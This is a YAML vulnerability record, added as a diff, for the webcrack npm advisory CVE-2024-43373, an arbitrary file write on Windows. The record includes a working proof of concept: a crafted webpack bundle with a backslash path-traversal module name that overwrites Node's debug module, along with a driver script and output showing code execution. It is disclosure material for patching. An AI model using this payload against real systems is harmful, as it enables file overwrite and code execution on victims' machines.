@@ -1,0 +1,250 @@
+advisory_id: GHSA-ccqh-278p-xq6w
+datasource_id: github_osv/GHSA-ccqh-278p-xq6w
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ccqh-278p-xq6w/GHSA-ccqh-278p-xq6w.json
+aliases:
+  - CVE-2024-43373
+summary: |
+  webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle
+  ### Summary
+  An arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.
+
+  ### Details
+
+  Source: [packages/webcrack/src/unpack/bundle.ts#L79](https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79)
+  ```ts
+  import { posix } from 'node:path';
+  import type { Module } from './module';
+
+  // eslint-disable-next-line @typescript-eslint/unbound-method
+  const { dirname, join, normalize } = posix;
+
+  /* ... snip ... */
+
+  const modulePath = normalize(join(path, module.path));
+  if (!modulePath.startsWith(path)) {
+      throw new Error(`detected path traversal: ${module.path}`);
+  }
+  await mkdir(dirname(modulePath), {
+      recursive: true
+  });
+  await writeFile(modulePath, module.code, 'utf8');
+  ```
+
+  In this code, the application explicitly relies on the POSIX version of path utilities (`dirname`, `join`, `normalize`) from Node.js. However, the vulnerability arises because the POSIX version of the `normalize` function does not recognize `\` as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.
+
+  ### PoC
+  The following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the `debug` module in Node.js:
+
+  **Malicious Script (what.js):**
+
+  ```js
+  (function (e) {
+      var n = {};
+      function o(r) {
+        if (n[r]) {
+          return n[r].exports;
+        }
+        var a = (n[r] = {
+          i: r,
+          l: false,
+          exports: {},
+        });
+        e[r].call(a.exports, a, a.exports, o);
+        a.l = true;
+        return a.exports;
+      }
+      o.p = '';
+      o((o.s = 386));
+    })({
+      './\\..\\node_modules\\debug\\src\\index': function (e, t, n) {
+          module.exports = () => console.log("pwned")
+      },
+    });
+  ```
+
+  **Webcrack Script (index.js):**
+
+  ```js
+  import fs from 'fs';
+  import { webcrack } from 'webcrack';
+
+  const input = fs.readFileSync('what.js', 'utf8');
+
+  const result = await webcrack(input);
+  console.log(result.code);
+  console.log(result.bundle);
+  await result.save('output-dir');
+  ```
+
+  **Execution:**
+  Running the above script with `node index.js` twice results in the following output being printed to the terminal:
+
+  ```
+  PS C:\Webcrack> node .\index.js
+  Debugger attached.
+  (function (e) {
+    var n = {};
+    function o(r) {
+      if (n[r]) {
+        return n[r].exports;
+      }
+      var a = n[r] = {
+        i: r,
+        l: false,
+        exports: {}
+      };
+      e[r].call(a.exports, a, a.exports, o);
+      a.l = true;
+      return a.exports;
+    }
+    o.p = "";
+    o(o.s = 386);
+  })({
+    "./\\..\\node_modules\\debug\\src\\index": function (e, t, n) {
+      module.exports = () => console.log("pwned");
+    }
+  });
+  WebpackBundle {
+    type: 'webpack',
+    entryId: '386',
+    modules: Map(1) {
+      './\\..\\node_modules\\debug\\src\\index' => WebpackModule {
+        id: './\\..\\node_modules\\debug\\src\\index',
+        isEntry: false,
+        path: '././\\..\\node_modules\\debug\\src\\index.js',
+        ast: [Object]
+      }
+    }
+  }
+  Waiting for the debugger to disconnect...
+  PS C:\Webcrack> node .\index.js
+  Debugger attached.
+  pwned
+  pwned
+  pwned
+  pwned
+  pwned
+  pwned
+  pwned
+  Waiting for the debugger to disconnect...
+  file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444
+    if (options.log) logger(`${name}: started`);
+                     ^
+
+  TypeError: logger is not a function
+      at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)
+      at Array.<anonymous> (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)
+      at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)
+      at async file:///C:/Webcrack/index.js:6:16
+
+  Node.js v18.16.0
+  ```
+
+  This demonstrates that the debug module was successfully overwritten and hijacked to print `pwned` to the console, confirming the arbitrary file write vulnerability has lead to code execution.
+
+  ### Impact
+  This vulnerability allows an attacker to write arbitrary `.js` files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.
+impacted_packages:
+  - purl: pkg:npm/webcrack
+    affected_versions: vers:npm/<=2.14.0
+    fixed_versions: vers:npm/2.14.1
+    affected_packages:
+      - pkg:npm/webcrack@0.0.0
+      - pkg:npm/webcrack@1.0.0
+      - pkg:npm/webcrack@1.0.1
+      - pkg:npm/webcrack@1.1.0
+      - pkg:npm/webcrack@1.2.0
+      - pkg:npm/webcrack@1.3.0
+      - pkg:npm/webcrack@1.4.0
+      - pkg:npm/webcrack@1.5.0
+      - pkg:npm/webcrack@1.5.1
+      - pkg:npm/webcrack@1.6.0
+      - pkg:npm/webcrack@1.6.1
+      - pkg:npm/webcrack@1.6.2
+      - pkg:npm/webcrack@1.7.0
+      - pkg:npm/webcrack@1.8.0
+      - pkg:npm/webcrack@1.9.0
+      - pkg:npm/webcrack@1.9.1
+      - pkg:npm/webcrack@1.10.0
+      - pkg:npm/webcrack@1.11.0
+      - pkg:npm/webcrack@2.0.0
+      - pkg:npm/webcrack@2.0.1
+      - pkg:npm/webcrack@2.1.0
+      - pkg:npm/webcrack@2.1.1
+      - pkg:npm/webcrack@2.1.2
+      - pkg:npm/webcrack@2.1.3
+      - pkg:npm/webcrack@2.2.0
+      - pkg:npm/webcrack@2.3.0
+      - pkg:npm/webcrack@2.4.0
+      - pkg:npm/webcrack@2.5.0
+      - pkg:npm/webcrack@2.5.1
+      - pkg:npm/webcrack@2.6.0
+      - pkg:npm/webcrack@2.6.1
+      - pkg:npm/webcrack@2.6.2
+      - pkg:npm/webcrack@2.6.3
+      - pkg:npm/webcrack@2.7.0
+      - pkg:npm/webcrack@2.7.1
+      - pkg:npm/webcrack@2.8.0
+      - pkg:npm/webcrack@2.8.1
+      - pkg:npm/webcrack@2.9.0
+      - pkg:npm/webcrack@2.9.1
+      - pkg:npm/webcrack@2.10.0
+      - pkg:npm/webcrack@2.11.0
+      - pkg:npm/webcrack@2.11.1
+      - pkg:npm/webcrack@2.12.0
+      - pkg:npm/webcrack@2.12.1
+      - pkg:npm/webcrack@2.13.0
+      - pkg:npm/webcrack@2.14.0
+    fixed_packages:
+      - pkg:npm/webcrack@2.14.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/j4k0xb/webcrack
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/j4k0xb/webcrack
+        commit: 241f9469e6401f3dabc6373233d85a5e76966b54
+        patch_text:
+      - vcs_url: https://github.com/j4k0xb/webcrack
+        commit: 4bc5c6f353012ee7edc2cb39d01a728ab7426999
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ccqh-278p-xq6w/GHSA-ccqh-278p-xq6w.json
+  - score: '6.2'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:H/SA:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ccqh-278p-xq6w/GHSA-ccqh-278p-xq6w.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+  - CWE-20
+references:
+  - url: https://github.com/j4k0xb/webcrack
+    reference_type:
+    reference_id:
+  - url: https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79
+    reference_type:
+    reference_id:
+  - url: https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-43373
+    reference_type:
+    reference_id: CVE-2024-43373
+  - url: https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w
+    reference_type:
+    reference_id: GHSA-ccqh-278p-xq6w
+exploits: []
